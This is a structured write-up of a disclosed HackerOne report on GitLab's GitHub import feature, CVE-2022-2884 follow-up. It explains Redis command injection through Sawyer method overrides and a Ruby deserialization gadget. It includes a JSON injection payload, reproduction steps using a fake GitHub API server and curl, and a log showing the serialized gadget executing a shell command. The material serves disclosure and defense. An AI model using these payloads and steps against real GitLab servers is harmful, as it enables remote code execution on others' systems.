# Remote Command Execution via GitHub Import - Redis Command Injection

## Metadata
- **Source:** HackerOne
- **Report:** 1679624 | https://hackerone.com/reports/1679624
- **Submitted:** 2022-08-25
- **Reporter:** vakzz
- **Program:** GitLab
- **Bounty:** Not specified in writeup
- **Severity:** critical
- **Vuln:** Remote Command Injection, Unsafe Deserialization, Improper Input Validation, Object Property Override
- **CVEs:** CVE-2022-2884
- **Category:** memory-binary

## Summary
GitLab's GitHub import feature is vulnerable to remote command execution through Redis command injection. An attacker can craft a malicious GitHub API response containing a specially crafted `default_branch` object that overrides the `to_s` and `bytesize` methods, allowing injection of arbitrary Redis commands. When combined with Ruby deserialization gadgets, this enables full RCE.

## Attack scenario
1. Attacker sets up a malicious server impersonating GitHub API using ngrok
2. Attacker crafts a JSON response with a `default_branch` object containing overridden `to_s` and `bytesize` methods with injected Redis RESP protocol commands
3. Victim GitLab admin imports a repository from attacker-controlled GitHub hostname
4. GitLab's `Sawyer` library converts the JSON response into Ruby objects with attacker-controlled methods
5. During repository import, `change_head()` calls `branch_names_include?()` which passes the malicious object to Redis
6. Redis command injection occurs due to mismatched bytesize, executing attacker payload; combined with Marshal.load gadgets for full RCE

## Root cause
The vulnerability stems from two design flaws: (1) Sawyer library's dynamic method generation allows arbitrary method overrides including `to_s` and `bytesize` on API response objects, and (2) GitLab passes unsanitized Sawyer::Resource objects directly to Redis operations. The initial CVE-2022-2884 patch only addressed one code path, leaving another vulnerable endpoint in `repository_importer.rb` unpatched.

## Attacker mindset
Attacker seeks to compromise GitLab instances by exploiting trust in GitHub API responses. By controlling the GitHub hostname during import, the attacker intercepts the API communication and injects malicious payloads that exploit method override capabilities combined with Redis protocol weaknesses. The use of deserialization gadgets demonstrates sophistication in achieving code execution.

## Defensive takeaways
- Validate and sanitize all external API responses before passing to system operations, especially Redis commands
- Implement strict type checking - reject Sawyer::Resource or similar dynamic objects from being used in command construction
- Apply input validation consistently across all code paths that handle API responses (patch only affected one location initially)
- Disable or restrict dynamic method generation on objects that handle untrusted data
- Use parameterized/prepared commands for Redis operations to prevent injection
- Avoid passing third-party library objects directly to critical operations without explicit conversion/validation
- Implement allowlists for branch names rather than relying on object methods
- Review all deserialization operations for gadget chain vulnerabilities

## Variant hunting
Search for other locations where: (1) Sawyer::Resource objects are passed to Redis operations, (2) External API responses are used in shell/command construction, (3) Dynamic method-generating libraries are used with untrusted data, (4) Marshal.load or other deserialization is used on API-sourced data, (5) Similar import functionality for other platforms (GitLab, Bitbucket, etc.)

## MITRE ATT&CK
- T1190
- T1059
- T1046
- T1555
- T1552

## Notes
This is a follow-up to CVE-2022-2884 which had a similar vulnerability in the same GitHub import feature but was only partially patched. The vulnerability requires authentication (valid GitLab API token) but allows unauthenticated attacker to control the GitHub API server. The RESP protocol injection is particularly dangerous because it allows arbitrary Redis commands. The writeup includes functional exploit code (gen_payload3.rb and fake_server3.py) demonstrating practical exploitation.

## Full report
<details><summary>Expand</summary>

### Summary

This is very similar to https://about.gitlab.com/releases/2022/08/22/critical-security-release-gitlab-15-3-1-released/#Remote%20Command%20Execution%20via%20Github%20import and allows arbitrary redis commands to be injected when imported a GitHub repository.

When importing a GitHub repo the api client uses `Sawyer` for handling the responses. This takes a json hash and converts it into a ruby class that has methods matching all of the keys:

https://github.com/lostisland/sawyer/blob/v0.9.2/lib/sawyer/resource.rb#L106-L110
```ruby
    def self.attr_accessor(*attrs)
      attrs.each do |attribute|
        class_eval do
          define_method attribute do
            @attrs[attribute.to_sym]
          end

          define_method "#{attribute}=" do |value|
            @attrs[attribute.to_sym] = value
          end

          define_method "#{attribute}?" do
            !!@attrs[attribute.to_sym]
          end
        end
      end
    end
```

This happens recursively, and allows for any method to be overridden including built-in methods such as `to_s`.

The redis gem uses `to_s` and `bytesize` to generate the RESP command, so if a `Sawyer::Resource` is ever passed in that has a controllable hash it can allow arbitrary redis commands to be injected into the stream as the string will be shorter than the `$` size provided (see https://redis.io/docs/reference/protocol-spec/)

https://github.com/redis/redis-rb/blob/v4.4.0/lib/redis/connection/command_helper.rb#L20
```ruby
            i = i.to_s
            command << "$#{i.bytesize}"
            command << i
```

The patch for CVE-2022-2884 added validation to `Gitlab::Cache::Import::Caching` but there is another spot where the  `Sawyer::Resource` is passed to redis:

https://gitlab.com/gitlab-org/gitlab/-/blob/v15.3.1-ee/lib/gitlab/github_import/importer/repository_importer.rb#L55
```ruby
       def import_repository
          project.ensure_repository

          refmap = Gitlab::GithubImport.refmap
          project.repository.fetch_as_mirror(project.import_url, refmap: refmap, forced: true)

          project.change_head(default_branch) if default_branch

          # The initial fetch can bring in lots of loose refs and objects.
          # Running a `git gc` will make importing pull requests faster.
          Repositories::HousekeepingService.new(project, :gc).execute

          true
        end
```

The `default_branch` param comes from the client repository (which is a nested Sawyer::Resource of attacker controlled data), and is passed to `change_head`  which then calls `branch_exists?`  and `branch_names_include?` which passes the value to redis:

https://gitlab.com/gitlab-org/gitlab/-/blob/v15.3.1-ee/lib/gitlab/repository_cache_adapter.rb#L71
```ruby
        define_method("#{name}_include?") do |value|
          ivar = "@#{name}_include"
          memoized = instance_variable_get(ivar) || {}
          lookup = proc { __send__(name).include?(value) } # rubocop:disable GitlabSecurity/PublicSend

          next memoized[value] if memoized.key?(value)

          memoized[value] =
            if strong_memoized?(name)
              lookup.call
            else
              result, exists = redis_set_cache.try_include?(name, value)

              exists ? result : lookup.call
            end

          instance_variable_set(ivar, memoized)[value]
        end
```

So by returning an api response with a `default_branch` that overrides `to_s` and `bytesize` you can call arbitrary redis commands:

```json
        {
            "default_branch": {
                "to_s": {
                    "to_s": 'ggg\r\nINJECT_RESP_HERE',
                    "bytesize": 3,
                }
            }
        }
```

This can be combined with a call to `Marshal.load` when loading a _gitlab_session to execute a deserialisation gadget (such as https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html) and gain RCE.

### Steps to reproduce

1. edit {F1882976} and change the command at `git_set`, that will be the command that is executed
1. change the `session:gitlab:gggg`  to be something other than `gggg`
1. run `ruby ./gen_payload3.rb` and copy the payload
1. edit {F1882972} and update the payload
1. run `ngrok http 5000` and copy the url
1. edit `fake_server3.py` and update the ngrok url
1. run the server with `FLASK_APP=fake_server3.py flask run`
1. run `curl --request POST --url "http://gitlab.wbowling.info/api/v4/import/github"  --header "content-type: application/json" --header "PRIVATE-TOKEN: API_TOKEN" --data "{\"personal_access_token\": \"fake_token\",\"repo_id\": \"12345\",\"target_namespace\": \"root\",\"new_name\": \"gh-import-$RANDOM\",\"github_hostname\": \"https://9895-45-248-49-157.ngrok.io\"}"` replacing `gitlab.wbowling.info` with your gitlab url, `API_TOKEN` with a valid gitlab token, `target_namespace` with a namespace you have access to, and `github_hostname` with your ngrok url
1. wait a minute or so, you should see requests coming in to the flask app. Once you see a request for `/api/v3/repos/fake/name` that should be long enough, there will also be an error in `/var/log/gitlab/gitlab-rails/exceptions_json.log` about `comparison of String with 0 failed`
1. run `curl -v 'http://gitlab.wbowling.info/root' -H 'Cookie: _gitlab_session=gggg'` replacing `gitlab.wbowling.info` with your gitlab url and `gggg` with the string you used in `gen_payload3.rb`
1. the payload should have executed

### Impact

Allows an attacker with the ability to import a github repo to execute arbitrary commands on the server

### Examples

See attached scripts and steps to reproduce

### What is the current *bug* behavior?

The `Sawyer::Resource` object is passed around and allows an attacker to override builtin methods

### What is the expected *correct* behavior?

The `Sawyer::Resource` has a `to_h` method which could potentially be used to ensure a plain has it passed around.

### Relevant logs and/or screenshots
redis command ends up as:
```
[pid  1362] read(67, "*1\r\n$5\r\nmulti\r\n*3\r\n$9\r\nsismember\r\n$53\r\ncache:gitlab:branch_names:root/gh-import-7316:102:set\r\n$3\r\nggg\r\n*3\r\n$3\r\nset\r\n$19\r\nsession:gitlab:jjjj\r\n$330\r\n\4\10[\10c\25Gem::SpecFetcherc\23Gem::InstallerU:\25Gem::Requirement[\6o:\34Gem::Package::TarReader\6:\10@ioo:\24Net::BufferedIO\7;\7o:#Gem::Package::TarReader::Entry\7:\n@readi\0:\f@headerI\"\10aaa\6:\6ET:\22@debug_outputo:\26Net::WriteAdapter\7:\f@socketo:\24Gem::RequestSet\7:\n@setso;\16\7;\17m\vKernel:\17@method_id:\vsystem:\r@git_setI\"\33echo id > /tmp/vakzz22\6;\fT;\22:\fresolve\r\n*2\r\n$6\r\nexists\r\n$53\r\ncache:gitlab:branch_names:root/gh-import-7316:102:set\r\n*1\r\n$4\r\nexec\r\n", 16384) = 570
```

error in the logs
```json
{"severity":"ERROR","time":"2022-08-25T03:57:55.006Z","correlation_id":"01GB9JCB7TYNH6F7J7W7NFQTDT","exception.class":"ArgumentError","exception.message":"comparison of String with 0 failed","exception.backtrace":["lib/gitlab/set_cache.rb:60:in `block in try_include?'","lib/gitlab/redis/wrapper.rb:23:in `block in with'","lib/gitlab/redis/wrapper.rb:23:in `with'","lib/gitlab/set_cache.rb:74:in `with'","lib/gitlab/set_cache.rb:59:in `try_include?'","lib/gitlab/repository_cache_adapter.rb:71:in `block in cache_method_as_redis_set'","app/models/repository.rb:288:in `branch_exists?'","app/models/repository.rb:1161:in `change_head'","app/models/concerns/has_repository.rb:17:in `change_head'","lib/gitlab/github_import/importer/repository_importer.rb:55:in `import_repository'","lib/gitlab/github_import/importer/repository_importer.rb:37:in `execute'","app/workers/gitlab/github_import/stage/import_repository_worker.rb:31:in `import'","app/workers/concerns/gitlab/github_import/stage_methods.rb:37:in `try_import'","app/workers/concerns/gitlab/github_import/stage_methods.rb:20:in `perform'","lib/gitlab/database/load_balancing/sidekiq_server_middleware.rb:26:in `call'","lib/gitlab/sidekiq_middleware/duplicate_jobs/strategi

</details>

---
*Analysed by Claude on 2026-05-11*
